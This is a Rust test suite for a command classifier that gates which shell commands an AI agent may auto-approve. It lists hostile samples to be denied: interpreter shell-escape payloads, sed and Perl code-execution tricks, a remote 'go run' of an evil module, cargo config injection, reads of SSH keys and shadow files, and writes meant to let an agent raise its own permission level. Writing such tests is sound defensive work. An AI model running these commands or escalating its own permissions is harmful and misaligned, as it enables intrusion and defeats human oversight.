        prop_assert!(!allowed, "substitution over an out-of-workspace root was allowed: `{}`", line);
    }

    /// A write-enabling flag or script command must never allow a write outside the workspace.
    #[test]
    fn write_mode_flags_deny_out_of_workspace_targets(
        template in proptest::sample::select(WRITE_MODE_CASES.to_vec()),
        target in proptest::sample::select(OUT_OF_WORKSPACE.to_vec()),
    ) {
        let line = template.replace("{p}", target);
        let allowed = command_verdict_in(&line, workspace()).is_allowed();
        prop_assert!(!allowed, "out-of-workspace write was allowed: `{}`", line);
    }

    /// Text appended to a BOUNDED substitution cannot escape its tag. Descending is fine; climbing
    /// out or splicing in a second unpinnable piece must collapse back to a denial.
    #[test]
    fn tagged_substitution_residue_cannot_escape(
        line in proptest::sample::select(TAGGED_RESIDUE_CASES.to_vec()),
    ) {
        let allowed = command_verdict_in(line, workspace()).is_allowed();
        prop_assert!(!allowed, "residue escaped the substitution's tag: `{}`", line);
    }

    /// A bounded substitution must not launder a write into the worktree-trusted rung. The tag
    /// bounds the substitution's VALUE; it says nothing about text appended to it, nor about an
    /// unknown filename a hidden-capable search may return.
    #[test]
    fn substitution_cannot_launder_a_trusted_write(
        line in proptest::sample::select(TRUSTED_WRITE_VIA_SUB_CASES.to_vec()),
    ) {
        let allowed = command_verdict_in(line, workspace()).is_allowed();
        prop_assert!(!allowed, "trusted-rung write laundered through a substitution: `{}`", line);
    }

    /// A read command naming a file inside an argument must not disclose an out-of-workspace file.
    #[test]
    fn read_commands_deny_out_of_workspace_targets(
        template in proptest::sample::select(READ_MODE_CASES.to_vec()),
        target in proptest::sample::select(OUT_OF_WORKSPACE.to_vec()),
    ) {
        let line = template.replace("{p}", target);
        let allowed = command_verdict_in(&line, workspace()).is_allowed();
        prop_assert!(!allowed, "out-of-workspace read was allowed: `{}`", line);
    }
}

// Pre-verb snippets for mlr's main region. A few carry values (`--from data.csv`) so the generator
// naturally produces the `--from <value> -I` interleaving — the exact shape that fooled the first
// verb-boundary draft.
const MLR_MAIN_SNIPPETS: &[&str] = &[
    "--csv", "--tsv", "--json", "--icsv --ojson",
    "--from data.csv", "--ifs ,", "--from in.csv --ofs ;", "--seed 42",
];
const MLR_VERBS: &[&str] = &["cat", "head", "tail", "cut", "sort", "filter"];

proptest! {
    /// `-I`/`--in-place` anywhere in mlr's pre-verb (main-flag) region is denied — the class the
    /// `--from data.csv -I cat` hole belonged to. (After the verb, `-I` isn't an in-place directive,
    /// so it's out of scope here.)
    #[test]
    fn mlr_in_place_flag_denied_anywhere_in_main_region(
        snippets in proptest::collection::vec(proptest::sample::select(MLR_MAIN_SNIPPETS.to_vec()), 0..4),
        verb in proptest::sample::select(MLR_VERBS.to_vec()),
        poison in proptest::sample::select(vec!["-I", "--in-place"]),
        pos in 0usize..12,
    ) {
        // Tokenize the chosen main-region snippets, then splice the poison flag in at some index.
        let mut main: Vec<String> =
            snippets.join(" ").split_whitespace().map(str::to_string).collect();
        let at = pos.min(main.len());
        main.insert(at, poison.to_string());
        let line = format!("mlr {} {} data.csv", main.join(" "), verb);
        prop_assert!(!is_safe_command(&line), "mlr in-place flag in main region was allowed: `{}`", line);
    }
}

// The cross-command guard for the whole KIND: commands that evaluate an argument as CODE (an
// embedded interpreter / DSL) must deny a shell-escape payload in that code slot. This is what
// flushed both the mlr `put '$x=system(…)'` hole (verb ran the DSL) and the sed `1e id` hole (the
// `e` command executes) — and it confirms perl/ruby/python/node/gnuplot/awk already hold.
//
// It is a CORPUS, not literally "all commands": a blanket "every command denies a shell-escape arg"
// is unsound (`echo 'system("x")'` is a safe print). The soundness comes from listing only commands
// whose argument IS code. Add a row when a new interpreter/DSL command is allowlisted.
const INTERPRETER_ESCAPES: &[(&str, &[&str])] = &[
    ("mlr put '{c}' data.csv", &["$x=system(\"id\")", "$*=exec(\"id\",\"a\")"]),
    ("mlr filter '{c}' data.csv", &["NR==1;system(\"id\")"]),
    ("awk '{c}' f.txt", &["BEGIN{system(\"id\")}", "{print | \"sh\"}"]),
    ("sed '{c}' f.txt", &["1e id", "e cat /etc/passwd", "s/x/y/e"]),
    ("perl -e '{c}'", &[
        "system(\"id\")", "exec(\"id\")", "`id`",
        // Perl double-quote INTERPOLATION executes code — the string-stripping bypass class.
        "print \"@{[system(q(id))]}\"",     // array-ref list interpolation
        "print \"${\\ system(q(id))}\"",    // scalar-ref interpolation
        "print \"@{[`id`]}\"",              // backtick inside interpolation
        "print \"$h{`id`}\"",               // hash SUBSCRIPT is evaluated
        "print \"$a[`id`]\"",               // array SUBSCRIPT is evaluated
    ]),
    ("ruby -e '{c}'", &["system(\"id\")", "exec(\"id\")", "`id`"]),
    ("python3 -c '{c}'", &["import os;os.system(\"id\")", "__import__(\"os\").system(\"id\")"]),
    ("node -e '{c}'", &["require(\"child_process\").execSync(\"id\")"]),
    ("gnuplot -e '{c}'", &["system \"id\""]),
];

proptest! {
    /// For any command in the interpreter corpus, a shell-escape in its code argument is denied.
    #[test]
    fn interpreter_commands_deny_shell_escapes(
        entry in proptest::sample::select(INTERPRETER_ESCAPES.to_vec()),
    ) {
        let (template, payloads) = entry;
        for payload in payloads {
            let line = template.replace("{c}", payload);
            prop_assert!(!is_safe_command(&line), "interpreter shell-escape allowed: `{}`", line);
        }
    }
}

// Flag-form equivalence: a valued flag means the same thing however it is spelled — separate
// (`-e V` / `--long V`), glued (`-eV`), or equals (`--long=V`). All four forms must classify
// IDENTICALLY, for the SAME value, whether that value is safe or dangerous. This catches the class
// where a parser handles one spelling but not another — the `sed -eS` regression, where glued `-e`
// fell through and the input file was scanned as the script. Unlike the poison guards (which only
// check the deny direction), this also catches a FALSE DENY of a legit form.
struct FormCase {
    cmd: &'static str,
    short: &'static str,
    long: &'static str,
    tail: &'static str,
    values: &'static [&'static str],
}

const FORM_CASES: &[FormCase] = &[
    FormCase {
        cmd: "sed",
        short: "-e",
        long: "--expression",
        tail: "file.txt",
        // A mix of safe scripts and dangerous ones — the forms must AGREE on each.
        values: &["s/a/b/", "s/a/b/g", "w /etc/passwd", "e", "r /etc/shadow", "1e id"],
    },
    FormCase {
        cmd: "grep",
        short: "-e",
        long: "--regexp",
        tail: "file.txt",
        values: &["foo", "^bar$", "a.*b"],
    },
];

fn form_combos() -> Vec<(String, String, String, String, String)> {
    let mut v = Vec::new();
    for c in FORM_CASES {
        for val in c.values {
            v.push((
                c.cmd.to_string(),
                c.short.to_string(),
                c.long.to_string(),
                c.tail.to_string(),
                (*val).to_string(),
            ));
        }
    }
    v
}

proptest! {
    /// The four spellings of a valued flag classify identically for the same value.
    #[test]
    fn flag_forms_classify_identically(combo in proptest::sample::select(form_combos())) {
        let (cmd, short, long, tail, v) = combo;
        let forms = [
            format!("{cmd} {short} '{v}' {tail}"),  // separate short: -e V
            format!("{cmd} {short}'{v}' {tail}"),   // glued short:    -eV
            format!("{cmd} {long} '{v}' {tail}"),   // separate long:  --long V
            format!("{cmd} {long}='{v}' {tail}"),   // equals long:    --long=V
        ];
        let verdicts: Vec<bool> = forms.iter().map(|f| is_safe_command(f)).collect();
        prop_assert!(
            verdicts.iter().all(|&x| x == verdicts[0]),
            "flag forms of the same value diverge: {:?}",
            forms.iter().zip(&verdicts).collect::<Vec<_>>(),
        );
    }
}

// ── Execution-origin scope (design: docs/design/behavioral-taxonomy-execution-origin.md) ──────────
//
// The SAFETY INVARIANTS below are active and green NOW — they lock current-correct behavior *before*
// the level-engine change, so the executor-locus work can't silently regress them: a code-exec
// command must deny a FOREIGN executor, an UNPINNABLE executor, and opaque non-shell INLINE code.
// The TARGET behaviors (workspace executor allows; build/test/RUN consistency) are `#[ignore]`d as the
// executable spec — un-ignore each as the resolver + level rule land (doc §8, §9).

// Templates with an `{exec}` slot = the script being executed. These accept any worktree-local
// FILESYSTEM path as the executor. `go run` is NOT here — its argument is a go PACKAGE (import-path
// semantics: a bare path may be a remote module), so it has its own test (`go_run_*`) below with a
// go-appropriate corpus.
const EXEC_FILE_CMDS: &[&str] =
    &["bash {exec}", "sh {exec}", "python3 {exec}", "node {exec}", "ruby {exec}"];
// Executors OUTSIDE the /work workspace — running these is running FOREIGN code.
const FOREIGN_EXECUTORS: &[&str] =
    &["/tmp/x.sh", "/etc/x.sh", "/usr/local/bin/x", "~/x.sh", "~/Downloads/x", "../x.sh", "/root/x"];
// Executors INSIDE the workspace (path-shaped, relative → resolves under /work → worktree).
const WORKTREE_EXECUTORS: &[&str] =
    &["./run.sh", "scripts/deploy.sh", "./cmd/tool", "bin/tool", "src/main.py"];

proptest! {
    /// SAFETY INVARIANT: a code-exec command with a FOREIGN executor is denied — always.
    #[test]
    fn code_exec_denies_foreign_executor(
        tmpl in proptest::sample::select(EXEC_FILE_CMDS.to_vec()),
        exec in proptest::sample::select(FOREIGN_EXECUTORS.to_vec()),
    ) {
        let line = tmpl.replace("{exec}", exec);
        prop_assert!(
            !command_verdict_in(&line, workspace()).is_allowed(),
            "foreign executor was allowed: `{}`",
            line,
        );
    }

    /// SAFETY INVARIANT: locus monotonicity — a foreign executor is never MORE permissive than the
    /// same command with a worktree executor. (Vacuous today since both deny; guards the coming change.)
    #[test]
    fn code_exec_worktree_dominates_foreign(
        tmpl in proptest::sample::select(EXEC_FILE_CMDS.to_vec()),
        w in proptest::sample::select(WORKTREE_EXECUTORS.to_vec()),
        f in proptest::sample::select(FOREIGN_EXECUTORS.to_vec()),
    ) {
        let foreign_ok = command_verdict_in(&tmpl.replace("{exec}", f), workspace()).is_allowed();
        let worktree_ok = command_verdict_in(&tmpl.replace("{exec}", w), workspace()).is_allowed();
        prop_assert!(!foreign_ok || worktree_ok, "foreign more permissive than worktree: `{}`", tmpl);
    }

    /// SAFETY INVARIANT: a project-runner's executor-REDIRECT flag (`cargo run --manifest-path P`)
    /// is locus-gated — a FOREIGN manifest denies (else `cargo run --manifest-path ~/evil/Cargo.toml`
    /// would run a foreign project), a worktree one allows (a nested-crate manifest is the dev loop).
    #[test]
    fn project_runner_redirect_flag_is_locus_gated(
        f in proptest::sample::select(FOREIGN_EXECUTORS.to_vec()),
        w in proptest::sample::select(WORKTREE_EXECUTORS.to_vec()),
    ) {
        prop_assert!(
            !command_verdict_in(&format!("cargo run --manifest-path {f}"), workspace()).is_allowed(),
            "foreign manifest-path allowed: `cargo run --manifest-path {}`", f,
        );
        prop_assert!(
            command_verdict_in(&format!("cargo run --manifest-path {w}"), workspace()).is_allowed(),
            "worktree manifest-path denied: `cargo run --manifest-path {}`", w,
        );
    }
}

/// `go run` gates its PACKAGE argument two ways: it must be a LOCAL filesystem path (a bare import
/// path may be a remote module — `go run pkg@version` DOWNLOADS AND RUNS remote code), and that path
/// must be worktree-local. A local worktree package allows; a remote import path, a bare import path,
/// or a foreign filesystem path denies.
#[test]
fn go_run_allows_local_worktree_package_only() {
    for ok in ["go run .", "go run ./cmd/tool", "go run ./main.go", "go run -race ./cmd", "go run main.go"] {
        assert!(command_verdict_in(ok, workspace()).is_allowed(), "go run local worktree package denied: {ok}");
    }
    for bad in [
        // remote / bare import paths — module-resolved, potentially network-fetched
        "go run rsc.io/goversion@latest", "go run github.com/evil/x@latest",
        "go run example.com/cmd", "go run bin/tool", "go run pkg/sub",
        // local-shaped but FOREIGN filesystem
        "go run ~/x.go", "go run /tmp/x.go", "go run ../x.go",
    ] {
        assert!(!command_verdict_in(bad, workspace()).is_allowed(), "go run non-local package allowed: {bad}");
    }
}

/// SAFETY INVARIANT: across the cargo build family, `--manifest-path FOREIGN` (running a foreign
/// project's build.rs/tests/binary) denies, and `--config` (a `runner`/`rustc-wrapper` command-
/// injection surface) is not accepted. A WORKTREE manifest still allows (a nested-crate build).
#[test]
fn cargo_family_manifest_path_and_config_are_gated() {
    for sub in ["build", "test", "bench", "check", "run", "doc"] {
        for m in ["~/evil/Cargo.toml", "/tmp/x/Cargo.toml", "/etc/x/Cargo.toml"] {
            let bad = format!("cargo {sub} --manifest-path {m}");
            assert!(!command_verdict_in(&bad, workspace()).is_allowed(), "foreign manifest allowed: {bad}");
        }
        let cfg = format!("cargo {sub} --config build.rustc-wrapper=/tmp/evil");
        assert!(!is_safe_command(&cfg), "cargo --config injection allowed: {cfg}");
    }
    for sub in ["build", "test", "check", "run"] {
        let ok = format!("cargo {sub} --manifest-path ./sub/Cargo.toml");
        assert!(command_verdict_in(&ok, workspace()).is_allowed(), "worktree manifest denied: {ok}");
    }
}

/// SAFETY INVARIANT: opaque non-shell INLINE code (`-c`/`-e` for an interpreter we don't analyze) is
/// denied. (`bash -c` is re-parsed and `perl -e` is AST-analyzed — those are on their own paths, so
/// they're excluded here; their safety is their analyzers' job, not this invariant's.)
#[test]
fn opaque_inline_code_denies() {
    for c in ["python3 -c 'import os'", "node -e 'x()'", "ruby -e 'x'"] {
        assert!(!is_safe_command(c), "opaque inline code allowed: {c}");
    }
}

/// SAFETY INVARIANT: an UNPINNABLE executor (env var, glob, command-substitution) is denied — the
/// fail-closed rule: an executor we can't pin to a worktree locus is foreign.
#[test]
fn unpinnable_executor_denies() {
    for c in ["bash $SCRIPT", "bash *.sh", "python3 $(get-script)", "sh \"$X\""] {
        assert!(!is_safe_command(c), "unpinnable executor allowed: {c}");
    }
}

/// SCOPE (doc §8/§9.6): a code-exec command with a WORKTREE executor is allowed — the dev loop.
/// Covers bash/sh, the interpreters (python3/node/ruby), and the compiled runners (go run).
#[test]
fn code_exec_allows_worktree_executor() {
    for tmpl in EXEC_FILE_CMDS {
        for exec in WORKTREE_EXECUTORS {
            let line = tmpl.replace("{exec}", exec);
            assert!(
                command_verdict_in(&line, workspace()).is_allowed(),
                "worktree executor denied: `{}`",
                line,
            );
        }
    }
}

/// SCOPE (doc §9.3): build/test/bench/RUN of the same project all classify identically —
/// `cargo run` is the dev loop, consistent with build/test/bench (which already run project code).
#[test]
fn cargo_build_family_run_is_consistent() {
    for c in ["cargo build", "cargo test", "cargo bench", "cargo run"] {
        assert!(is_safe_command(c), "build-family sub is inconsistent (run should match build/test): {c}");
    }
}

/// RATCHET guard — flush out (and block new) DENYLIST-shaped handlers. safe-chains is an
/// ALLOWLIST classifier: a handler must enumerate what's SAFE and deny the rest by omission, so a
/// new/unknown dangerous input fails CLOSED. A denylist (a list of BAD things, allow the rest)
/// fails OPEN — a not-yet-listed danger slips through. The clearest signal is a `static`/`const`
/// named for what it REJECTS (`*_DANGEROUS_*`, `*_MUTATING_*`, `*_FORBIDDEN_*`, …). Known offenders
/// are grandfathered while they're converted to positive allowlists (see TODO.md); the set only
/// SHRINKS — a NEW denylist-named constant fails here. (The behavioral backstop for the
/// "argument-is-code" subclass is `interpreter_commands_deny_shell_escapes`.)
#[test]
fn no_new_denylist_named_constants_in_handlers() {
    // Being converted to safe-flag/subcommand allowlists. Remove each as it lands; goal is empty.
    // (Empty now — every handler denylist has been converted to a positive allowlist.)
    const GRANDFATHERED: &[&str] = &[];
    const MARKERS: &[&str] =
        &["DANGEROUS", "FORBIDDEN", "UNSAFE", "BLOCKED", "BLOCKLIST", "DENYLIST", "MUTATING", "BADWORD"];

    fn decl_name(line: &str) -> Option<&str> {
        for kw in ["static ", "const "] {
            if let Some(idx) = line.find(kw) {
                let name = line[idx + kw.len()..].split([':', ' ', '<', '=']).next()?.trim();
                if !name.is_empty() {
                    return Some(name);
                }
            }
        }
        None
    }

    fn rs_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
        for e in std::fs::read_dir(dir).unwrap() {
            let p = e.unwrap().path();
            if p.is_dir() {
                rs_files(&p, out);
            } else if p.extension().is_some_and(|x| x == "rs") {
                out.push(p);
            }
        }
    }

    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/handlers");
    let mut files = Vec::new();
    rs_files(&root, &mut files);
    assert!(files.len() > 5, "scanned only {} handler files — the walk is broken, guard is vacuous", files.len());

    let mut offenders = Vec::new();
    let mut seen_grandfathered = Vec::new();
    for file in &files {
        for line in std::fs::read_to_string(file).unwrap().lines() {
            let Some(name) = decl_name(line) else { continue };
            if !MARKERS.iter().any(|m| name.contains(m)) {
                continue;
            }
            if GRANDFATHERED.contains(&name) {
                seen_grandfathered.push(name.to_string());
            } else {
                offenders.push(format!("{}: `{name}`", file.file_name().unwrap().to_string_lossy()));
            }
        }
    }

    assert!(
        offenders.is_empty(),
        "new DENYLIST-named constant(s) — enumerate the SAFE surface (positive allowlist), not the \
         dangerous one, so unknown inputs fail closed:\n  {}",
        offenders.join("\n  "),
    );
    // Non-vacuity + drift: every grandfathered name must still exist, else remove it from the list.
    for g in GRANDFATHERED {
        assert!(
            seen_grandfathered.iter().any(|s| s == g),
            "grandfathered denylist constant `{g}` no longer found — it was converted or renamed; \
             drop it from GRANDFATHERED so the ratchet stays tight",
        );
    }
}

/// SELF-ESCALATION DEFENSE (systemic, command-level lock). safe-chains' TRUST ROOT —
/// `~/.config/safe-chains.toml`, the user config that grants what commands may run, pins which
/// repo `.safe-chains.toml` files are honored, AND sets the auto-approve `level` ceiling
/// (`configured_hook_level`) — must be UNWRITABLE by any auto-approved command. If an agent could
/// write it, it would grant itself everything, pin a malicious repo config, OR raise its own level
/// ceiling to yolo. This lock is precisely what lets the hook trust the configured level.
/// This enumerates the WRITE VECTORS (redirects, tee, cp/mv/install, dd, truncate, ln, in-place
/// editors) × PATH SPELLINGS (tilde, `$HOME`, absolute, `/./` dodge) and asserts every one DENIES —
/// pinning end-to-end what `regions::…safe_chains_config_is_read_ok_write_denied_and_ungrantable`
/// only checks at the locus level, so a future writer handler that skips the locus gate is caught.
/// READS stay allowed (safe-chains reads its own config).
#[test]
fn trust_root_is_unwritable_by_any_command() {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let spellings = [
        "~/.config/safe-chains.toml".to_string(),
        "$HOME/.config/safe-chains.toml".to_string(),
        format!("{home}/.config/safe-chains.toml"),
        "~/.config/./safe-chains.toml".to_string(),
    ];
    let vectors: &[&str] = &[
        "echo evil > {cfg}",
        "echo evil >> {cfg}",
        "cat payload > {cfg}",
        "tee {cfg}",
        "tee -a {cfg}",
        "cp payload.toml {cfg}",
        "mv payload.toml {cfg}",
        "install payload.toml {cfg}",
        "dd of={cfg}",
        "truncate -s 0 {cfg}",
        "ln -sf payload.toml {cfg}",
        "sed -i 's/x/y/' {cfg}",
        "perl -i -pe 's/x/y/' {cfg}",
    ];
    let mut leaks = Vec::new();
    for cfg in &spellings {
        for v in vectors {
            let line = v.replace("{cfg}", cfg);
            if is_safe_command(&line) {
                leaks.push(line);
            }
        }
    }
    assert!(
        leaks.is_empty(),
        "TRUST ROOT WRITABLE — self-escalation hole (an agent could grant itself permissions):\n  {}",
        leaks.join("\n  "),
    );
    // Reads stay OK — safe-chains must be able to read its own config.
    assert!(
        is_safe_command("cat ~/.config/safe-chains.toml"),
        "safe-chains must be able to READ its own config (only writes are denied)",
    );
}

/// CALLING-CONVENTIONS invariant for PATHS — safety on the OPERATION, not the SYNTAX. The ABSOLUTE
/// and RELATIVE spellings of the same in-root file must classify IDENTICALLY: `cat /work/src/x`
/// must not deny while `cat src/x` allows (the over-deny the other-session forensics found — an
/// in-root absolute path was scored as out-of-workspace). Out-of-root absolutes (system, sibling
/// repo, `..`-escape) still deny. Requires cwd/root context (which the hook supplies).
#[test]
fn absolute_and_relative_in_root_paths_classify_identically() {
    for rel in ["README.md", "src/main.rs", "a/b/c.rs", "notes.txt"] {
        let abs = format!("/work/{rel}");
        let rv = command_verdict_in(&format!("cat {rel}"), workspace()).is_allowed();
        let av = command_verdict_in(&format!("cat {abs}"), workspace()).is_allowed();
        assert_eq!(rv, av, "abs vs rel spelling DISAGREE for in-root `{rel}` vs `{abs}`");
        assert!(rv, "an in-root path must allow (both spellings): {rel}");
    }
    // out-of-root absolutes still deny (no syntax loophole)
    for bad in ["/etc/hosts", "/Users/someone/other/x", "/work/../sibling/secret", "/root/.ssh/id_rsa"] {
        assert!(
            !command_verdict_in(&format!("cat {bad}"), workspace()).is_allowed(),
            "out-of-root absolute must deny: {bad}",
        );
    }
}
